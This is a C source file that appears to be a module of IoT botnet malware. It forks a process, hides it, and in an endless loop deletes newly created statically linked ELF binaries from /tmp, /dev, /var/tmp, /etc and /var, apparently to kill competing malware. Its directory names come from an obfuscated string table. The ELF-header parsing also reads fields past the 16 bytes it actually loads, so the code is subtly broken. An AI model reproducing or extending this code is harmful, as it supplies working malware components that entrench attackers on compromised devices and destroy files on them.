#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <mntent.h>

#include "includes.h"
#include "util.h"
#include "watcher.h"
#include "table.h"

int checkerpid = 0;

#define EI_NIDENT 16
#define PT_DYNAMIC 2
#define SELFMAG 4
#define ELFMAG "\177ELF"

int read_bytes(int fd, off_t offset, void *buf, size_t size) {
    if (lseek(fd, offset, SEEK_SET) < 0) {
        return -1;
    }
    if (read(fd, buf, size) != size) {
        return -1;
    }
    return 0;
}

unsigned short read_u16(unsigned char *buf, int little_endian) {
    if (little_endian) {
        return buf[0] | (buf[1] << 8);
    } else {
        return (buf[0] << 8) | buf[1];
    }
}

unsigned int read_u32(unsigned char *buf, int little_endian) {
    if (little_endian) {
        return buf[0] | (buf[1] << 8) | (buf[2] << 16) | (buf[3] << 24);
    } else {
        return (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | buf[3];
    }
}

unsigned long read_u64(unsigned char *buf, int little_endian) {
    unsigned long value = 0;
    int i;

    if (little_endian) {
        for (i = 0; i < 8; i++) {
            value |= (unsigned long)buf[i] << (8 * i);
        }
    } else {
        for (i = 0; i < 8; i++) {
            value |= (unsigned long)buf[i] << (8 * (7 - i));
        }
    }

    return value;
}

int is_elf_file(const char *filename) {
    int fd = open(filename, O_RDONLY);
    if (fd < 0) return 0;

    unsigned char e_ident[EI_NIDENT];
    if (read_bytes(fd, 0, e_ident, EI_NIDENT) == -1) {
        close(fd);
        return 0;
    }

    if (util_memcmp(e_ident, ELFMAG, SELFMAG) != 0) {
        close(fd);
        return 0;
    }

    int little_endian = (e_ident[5] == 1);
    int elf_class = e_ident[4];

    off_t e_phoff = (elf_class == 1) ? read_u32(e_ident + 0x1C, little_endian) : read_u64(e_ident + 0x20, little_endian);
    unsigned short e_phnum = (elf_class == 1) ? read_u16(e_ident + 0x2C, little_endian) : read_u16(e_ident + 0x38, little_endian);
    unsigned short e_phentsize = (elf_class == 1) ? read_u16(e_ident + 0x28, little_endian) : read_u16(e_ident + 0x36, little_endian);

    size_t phdrs_size = e_phnum * e_phentsize;
    unsigned char *phdrs = malloc(phdrs_size);
    if (!phdrs) {
        close(fd);
        return 0;
    }

    if (read_bytes(fd, e_phoff, phdrs, phdrs_size) == -1) {
        free(phdrs);
        close(fd);
        return 0;
    }

    int is_static = 1;
    for (int i = 0; i < e_phnum; ++i) {
        unsigned int p_type = read_u32(phdrs + (i * e_phentsize), little_endian);
        if (p_type == PT_DYNAMIC) {
            is_static = 0;
            break;
        }
    }

    free(phdrs);
    close(fd);

    return is_static;
}

void check_and_delete_files(const char *dirname, time_t current_time) 
{
    DIR *dir = opendir(dirname);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];
    struct stat file_stat;

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        if (stat(path, &file_stat) == -1) continue;

        if (S_ISREG(file_stat.st_mode) && file_stat.st_ctime > current_time && is_elf_file(path)) {
#ifdef DEBUG
            printf("[watcher] Removing new statically compiled ELF file: %s\n", path);
#endif
            unlink(path);
        }
    }
    closedir(dir);
}

void init_checker(void) {
    checkerpid = fork();
    if (checkerpid > 0 || checkerpid == -1) return;

    hide_main_process(getpid());
    time_t current_time = time(NULL);

    while (1) 
    {
        check_and_delete_files(enc[DIR_TMP].string, current_time);
        check_and_delete_files(enc[DIR_DEV].string, current_time);
        check_and_delete_files(enc[DIR_VAR_TMP].string, current_time);
        check_and_delete_files(enc[DIR_ETC].string, current_time);
        check_and_delete_files(enc[DIR_VAR].string, current_time);
        usleep(rand() % 20000 + 40000);
    }
}

void kill_checker(void) 
{
    if (checkerpid != 0) 
    {
#ifdef DEBUG
        printf("[wiper] Terminated proccess!\n");
#endif
        kill(checkerpid, SIGKILL);
    }
}
